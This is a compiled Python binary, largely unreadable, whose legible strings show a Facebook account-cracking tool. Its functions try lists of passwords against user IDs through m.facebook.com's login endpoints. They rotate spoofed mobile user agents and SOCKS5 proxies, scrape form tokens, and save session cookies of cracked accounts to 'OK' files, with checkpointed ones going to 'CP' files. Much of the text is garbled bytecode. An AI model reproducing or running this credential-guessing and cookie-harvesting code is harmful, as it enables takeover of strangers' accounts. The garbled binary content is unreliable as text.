  r�  r�  r�   r�  r�  r  r   r   rM   rC   r�  r�  r�  r�  r�  r�  r�  r�  rP   r�  r�  r�  r�  r  r  r  r  r  r  r  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r  r  r�  r�  r�  r  s	            r   r�  r�  C  s�	  � ��  P�  PQ�  P�  P�  VW�  P�  P�  ab�  P�  P�  fg�  P�  P�  yz�  P�  P�  ~�  P�  P�  P�  RU�  V�  W�  W�  W��]�Q�]�]�1�]�]�a�]�]�1�]�]�a�]�]�1�]�]�]�_b�c�d�d�d��  B�A�  B�  B�  B�  C�  C�  C��v����
�r���� g!�d�� f!� f!�f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�
��3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��K�� � � ��Z�Z��L� �!�!�!��Z�Z��D������Z�Z��F�
�����Z�Z��F�
�����Z�Z��E�	�����Z�Z��G������Z�Z��c�	�%�� � � ��Z�Z��s�
�6�!�"�"�"��Z�Z����G�#�$�$�$��Z�Z��c�	�����Z�Z��s�
�����Z�Z��������Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����
�3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��_�_�_��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��K�� � � ��Z�Z��L� �!�!�!��Z�Z��D������Z�Z��F�
�����Z�Z��F�
�����Z�Z��E�	�����Z�Z��G������Z�Z��c�	�%�� � � ��Z�Z��s�
�6�!�"�"�"��Z�Z����G�#�$�$�$��Z�Z��c�	�����Z�Z��s�
�����Z�Z��������Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
����
�g�o�o�� � ���Z�Z���������6����K�K���C� � � � ��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��&����K�K��S�������6����K�K��c�#������F����K�K��s�3����������K�K��C�����������K�K��C�����������K�K��C�����������K�K��C�������6����K�K��c�#����������K�K��C�������6����K�K��c�#������K�K���C� � � � �Mf!�g!� g!� g!� g!� g!� g!� g!� g!� g!� g!� g!���� g!� g!� g!� g!�P �r����	4�������T�%�w�'�'�'�(�(�(��Q�O�O�P�P���9���
�*�*�*�*�*��&�&�&�&�&s   �a?e�e�ec                 �r	  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          j        �   �         }|D �]�}	 t          j        t           �  �        }	dd|	z   i}
|j        �                    dddd|dddddd�
�  �         |�                    d| z   dz   �  �        }t)          j        dt          |j        �  �        �  �        �                    d�  �        t)          j        dt          |j        �  �        �  �        �                    d�  �        | dd |d!�}d"�                    d#� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d$z  }i d%d�d&d�d'd(�d)d�d*d+�d,d�d-d.�d/d0�d1|�d2d�d3d4�d5d�d6d�d7d�d8d| z   dz   �d9d:�d;d�}|�                    d<|d=|i|d>|
�?�  �        }d@|j        �                    �   �         �                    �   �         v r�t=          dAt>          � dBt          � dCt>          � | � dD|� t@          � dE|� tB          � ��  �         tE          dFtF          z   dG�  �        �                    | dHz   |z   dIz   �  �         tH          �%                    | dHz   |z   �  �         t          dz  a	 �nSdJ|j        �                    �   �         �                    �   �         v r�t          dz  a|j        �                    �   �         }d"�                    dK� |j        �                    �   �         �                    �   �         D �   �         �  �        }t=          dAtL          � dLt          � dCtN          � | � dD|� dM|� dN|� tP          � ��  �         tE          dOtR          z   dG�  �        �                    | dPz   |z   dPz   |z   dIz   �  �         tU          tV          |�  �          n1��q# t          j,        j-        $ r t]          j/        dQ�  �         Y ���w xY wt          dz  ad S )RNr�   rK   �%�   └───[1;90m[z[1;91mAHMAD[1;90m]-[[1;96m�[1;90m/[1;95m�[1;90m]-[[1;92mOK:�[1;90m]-[[1;93mCP:�[1;90m]-[[1;94m�[1;90m]�    ✓�z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1zmMozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148zoMozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1��Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1z�Autoplius.lt/6.6.0 Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EmbeddedBrowser DeviceUID:z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1z�Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1�  Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/��Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62��}Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 RuxitSynthetic/1.0��Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 RuxitSynthetic/1.0z{Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Zoom 3.6.0)z�Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1zyMozilla/5.0 (Linux; Android 11; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 11; moto g stylus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; ART-L29; HMSCore 6.6.0.311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; jhs561 Build/GIADA.eng.zc.20200922.153858; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Safari/537.36�vMozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36�http�	socks5://�m.facebook.com�	max-age=0�?1r/   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�same-origin�cors�empty�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�
�Host�cache-control�sec-ch-ua-mobile�upgrade-insecure-requestsr;  �accept�sec-fetch-site�sec-fetch-mode�sec-fetch-dest�accept-language�8https://m.facebook.com/login/device-based/password/?uid=�h  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified�login_no_pin��lsd�jazoestr�  �next�flow�pass�;c                 �"   � g | ]\  }}|�d |����S �r&   r�   ��.0�key�values      r   �
<listcomp>zmobilev1.<locals>.<listcomp>�  �'   � �^�^�^�*�#�u�#�#�#�u�u�-�^�^�^r   �  m_pixel_ratio=2.625; wd=412x756rF  rG  �	sec-ch-ua�(" Not A;Brand";v="99", "Chromium";v="98"rH  �sec-ch-ua-platform�	"Android"rI  �origin�https://m.facebook.com�content-type�!application/x-www-form-urlencodedr;  rJ  �x-requested-with�XMLHttpRequestrK  rL  rM  �referer�accept-encoding�gzip, deflate, brrN  �Qhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDr�   F�r�  r�   r>  �allow_redirects�proxies�
checkpoint�   └──╭➣[�AhmadCPr  � | �   
   └───➣ r  r�   �    • rx   �c_userc                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev1.<locals>.<listcomp>�  �'   � �a�a�a�:�3��3�3�3���.�a�a�ar   �AhmadOK�   
  └──╭➣ �   
         └───➣ r  r  r   �0r�   r�   �loopr
   r�  r�   r�   r�   �ok�cprN  r   r�   r�   r~   r�   �proxr>  r  r   r�   r�   r�   r�   r�   r�   �get_dict�items�post�keysr   rU   r8   r*   ry   r   �akunr}   r�   rR   r2   r�  �cek_apk�sessionr�   r�   r�   r�   �r
  r  �bi�pers�fffr�   �ua2r�   �pw�nip�proxsr�   �dataa�koki�heade�po�coki�kukis                     r   r�  r�  �  s#  � ��m�W�I�����S���S�����
�������  UW�  UW�  UW�  X\�  X\�  X\�  ]`�  ad�  ]e�  ]e�  ]e�  ]e�  fh�  fh�  fh�  ik�  ik�  ik�  lo�  pt�  lu�  lu�  lu�  vy�  z}�  v~�  v~�  v~�  v~�  @�  @�  @�  A�  B�  B�  B�  CF�  CM�  CS�  CS�  CU�  CU�  CU��m� � � � � �� �}� � � � � �� ������ � �R���}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
\�q�
\�
\��
\�
\�a�
\��
\�
\��
\�Q�
\�
\�UW�
\�YZ�
\�
\�]�]�]���s��3�����c�'�k�"�n�T�1�2�2�2��K�K��G��B�������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
y�q�
y�
y��
y�
y�a�
y��
y�
y��
y�
y�QU�
y�
y�rt�
y�vw�
y�
y�z�z�z���s��3�����c�#�g�b�j��n�R�/��4�5�5�5��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q�����   �IQ>�D Q>�>(R*�)R*c                 �r	  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          j        �   �         }|D �]�}	 t          j        t           �  �        }	dd|	z   i}
|j        �                    dddd|dddddd�
�  �         |�                    d| z   dz   �  �        }t)          j        dt          |j        �  �        �  �        �                    d�  �        t)          j        dt          |j        �  �        �  �        �                    d�  �        | dd |d!�}d"�                    d#� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d$z  }i d%d�d&d�d'd(�d)d�d*d+�d,d�d-d.�d/d0�d1|�d2d�d3d4�d5d�d6d�d7d�d8d| z   dz   �d9d:�d;d�}|�                    d<|d=|i|d>|
�?�  �        }d@|j        �                    �   �         �                    �   �         v r�t=          dAt>          � dBt          � dCt>          � | � dD|� t@          � dE|� tB          � ��  �         tE          dFtF          z   dG�  �        �                    | dHz   |z   dIz   �  �         tH          �%                    | dHz   |z   �  �         t          dz  a	 �nSdJ|j        �                    �   �         �                    �   �         v r�t          dz  a|j        �                    �   �         }d"�                    dK� |j        �                    �   �         �                    �   �         D �   �         �  �        }t=          dAtL          � dLt          � dCtN          � | � dD|� dM|� dN|� tP          � ��  �         tE          dOtR          z   dG�  �        �                    | dPz   |z   dPz   |z   dIz   �  �         tU          tV          |�  �          n1��q# t          j,        j-        $ r t]          j/        dQ�  �         Y ���w xY wt          dz  ad S )RNr�   rK   r*  r+  z[1;91mAhmadFB[1;90m]-[[1;96mr,  r-  r.  r/  r0  r1  r2  r6  r;  r<  r=  r>  r?  r/   r@  rA  rB  rC  rD  rE  rO  rP  rQ  r   rR  rS  rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev2.<locals>.<listcomp>
  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rj  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  rr  r�   Frs  rv  rw  rx  r  ry  rz  r  r�   r{  rx   r|  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev2.<locals>.<listcomp>  r~  r   r  r�  r�  r  r  r   r�  r�  s                     r   r�  r�  �  s#  � ��m�W�I�����S���S�����
�������  WY�  WY�  WY�  Z^�  Z^�  Z^�  _b�  cf�  _g�  _g�  _g�  _g�  hj�  hj�  hj�  km�  km�  km�  nq�  rv�  nw�  nw�  nw�  x{�  |�  x@�  x@�  x@�  x@�  AB�  AB�  AB�  C�  D�  D�  D�  EH�  EO�  EU�  EU�  EW�  EW�  EW��m� � � � � �� �}� � � � � �� ������ � �R���}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
\�q�
\�
\��
\�
\�a�
\��
\�
\��
\�Q�
\�
\�UW�
\�YZ�
\�
\�]�]�]���s��3�����c�'�k�"�n�T�1�2�2�2��K�K��G��B�������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
y�q�
y�
y��
y�
y�a�
y��
y�
y��
y�
y�QU�
y�
y�rt�
y�vw�
y�
y�z�z�z���s��3�����c�#�g�b�j��n�R�/��4�5�5�5��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����r�  c                 �  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          ��d��  �         t          j        �                    �   �          d}d}t          j        �   �         }|D �]h}	 |j        �                    dd|ddddddddddd��  �         |�                    d�  �        j        }	t)          j        dt          |	�  �        �  �        �                    d�  �        t)          j        dt          |	�  �        �  �        �                    d�  �        | d|d d!�}
|j        �                    dd"dd#d$|ddddddd%ddd&��  �         |�                    d'|
d(�)�  �        }d*|j        �                    �   �         �                    �   �         v r�t          d+t6          � | � d,|� ��  �         t          d-t          � d.t          � dt6          � |� t8          � d/�	�  �         t;          d0t<          z   d1�  �        �                    | d2z   |z   d/z   �  �         t@          �!                    | d2z   |z   �  �         t          dz  a �n�d3|j        �                    �   �         �                    �   �         v �r9t          dz  a|j        �                    �   �         }d4�"                    d5� |j        �                    �   �         �#                    �   �         D �   �         �  �        }t          d+tH          � | � d,|� ��  �         t          d-t          � d6t          � dtH          � |� tH          � ��  �         t          d-t          � d7t          � dt6          � |� t8          � d/�	�  �         t;          d8tJ          z   d1�  �        �                    | d2z   |z   d2z   |z   d/z   �  �         tM          tN          |�  �          n1��;# t          j(        j)        $ r tU          j+        d9�  �         Y ��fw xY wt          dz  ad S ):Nr�   rK   r*  u   └───r�   re   z][OK : z]-[CP : �]-[r�   rM   ra  z�Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36r=  r/   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gprA  rB  rC  �document�https://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8�rF  rI  r;  rJ  �dntrm  rK  rL  �sec-fetch-userrM  ro  rp  rN  ��  https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdrrQ  r   rR  rT  �8https://developers.facebook.com/tools/debug/accesstoken/�rV  rW  r�  rY  rZ  rX  r>  rj  rl  �lhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�rF  rG  rI  ri  rk  r;  rJ  rm  rK  rL  r�  rM  ro  rp  rN  �Chttps://m.facebook.com/login/device-based/validate-password/?shbl=0F�r�  rt  rv  �   ├──╭➣ ry  r_  u   │  └───➣rx   r  r�   r  r|  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev3.<locals>.<listcomp>>  r~  r   u   │ └──╭➣u   │        └───➣r  r   ),r�   r�   r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r>  r  r   r�   r�   r�   r�   r�  r�   r�  r�  r�   r2   ry   r   r�   r�  r}   r�   r�  rR   r�  r�  r�  r�   r�   r�   r�   �r
  r  r�  r�  r�  r�   r�  r�   r�  r�   r�  r�  r�  r�  s                 r   r�  r�  #  s+  � ��m�W�I�����S���S�����
����b�b�b����c�#�h�h�h�h�r�r�r�RT�RT�RT�UX�Y]�U^�U^�U^�_b�cf�_g�_g�_g�_g�hi�hi�j�ps�t�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH� i�� d�������� � �R���;���.�3�\_�  jJ�  QT�  hu�  GT�  fl�  ~E�  Wa�  lE�  Xj�  }Y	�  Z	�  Z	�  [	�  [	�  [	�
�w�w�  n�  o�  o�  t�1���5�s�1�v�v�>�>�D�D�Q�G�G�RT�R[�\z�|�  AB�  }C�  }C�  SD�  SD�  SJ�  SJ�  KL�  SM�  SM�  TW�  _m�  uw�  y�  z�  z�5��;���.�{�gj�  uM�  ]@�  NP�  Zz�  N[�  mz�  LR�  dk�  }G	�  R	@�  Se�  xT�  U�  U�  V�  V�  V����V�\a�rw��x�x�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
.�q�
.�#�
.�
.�"�
.�
.�/�/�/�	�
6�q�
6�
6�a�
6�
6�!�
6�R�
6��
6�
6�
6�7�7�7���s��3�����c�#�g�b�j��o�.�.�.��K�K��C���
������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
.�q�
.�#�
.�
.�"�
.�
.�/�/�/�	�
5�q�
5�
5�Q�
5�
5��
5�D�
5�!�
5�
5�6�6�6�	�
<�q�
<�
<�A�
<�
<��
<�2�
<�q�
<�
<�
<�=�=�=���s��3�����c�#�g�b�j��n�T�1�$�6�7�7�7��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �GP�(E%P�(P=�<P=c                 �2	  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          j        �   �         }|D �]~}	 t          j        t           �  �        }	dd|	z   i}
|j        �                    dddd|dddddd�
�  �         |�                    d| z   dz   �  �        }t)          j        dt          |j        �  �        �  �        �                    d�  �        t)          j        dt          |j        �  �        �  �        �                    d�  �        | dd |d!�}d"�                    d#� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d$z  }i d%d�d&d�d'd(�d)d�d*d+�d,d�d-d.�d/d0�d1|�d2d�d3d4�d5d�d6d�d7d�d8d| z   dz   �d9d:�d;d�}|�                    d<|d=|i|d>|
�?�  �        }d@|j        �                    �   �         �                    �   �         v r�t=          dAt>          � | � dB|� t@          � dC|� tB          � �	�  �         tE          dDtF          z   dE�  �        �                    | dFz   |z   dGz   �  �         tH          �%                    | dFz   |z   �  �         t          dz  a	 �nCdH|j        �                    �   �         �                    �   �         v r�t          dz  a|j        �                    �   �         }d"�                    dI� |j        �                    �   �         �                    �   �         D �   �         �  �        }t=          dAtL          � | � dB|� dJ|� dK|� t>          � �
�  �         tE          dLtN          z   dE�  �        �                    | dMz   |z   dMz   |z   dGz   �  �         tQ          tR          |�  �          n1��Q# t          j*        j+        $ r tY          j-        dN�  �         Y ��|w xY wt          dz  ad S )ONr�   rK   r*  r_  u   └───[re   �][OK:�]-[CP:�][r�   �   r2  r6  r;  r<  r=  r>  r?  r/   r@  rA  rB  rC  rD  rE  rO  rP  rQ  r   rR  rS  rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev4.<locals>.<listcomp>i  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rj  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  rr  r�   Frs  rv  r�  ry  �   
│  └───➣ r  r�   r{  rx   r|  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev4.<locals>.<listcomp>v  r~  r   u   
│ └──╭➣ u   
│        └───➣ r  r  r   ).r�   r�   r�  r
   r�  r�   r�   r�   r�  r�  rN  r   r�   r�   r~   r�   r�  r>  r  r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r�  r   r�   r8   r2   ry   r   r�  r}   rR   r�  r�  r�  r�   r�   r�   r�   r�  s                     r   r�  r�  M  sa  � ��m�W�I�����S���S�����
�������r�r�r�$�$�$�s�SV�x�x�x�x�XZ�XZ�XZ�[]�[]�[]�^a�bf�^g�^g�^g�hk�lo�hp�hp�hp�hp�qr�qr�qr�s�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH��m� � � � � �� �}� � � � � �� ������ � �R���}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
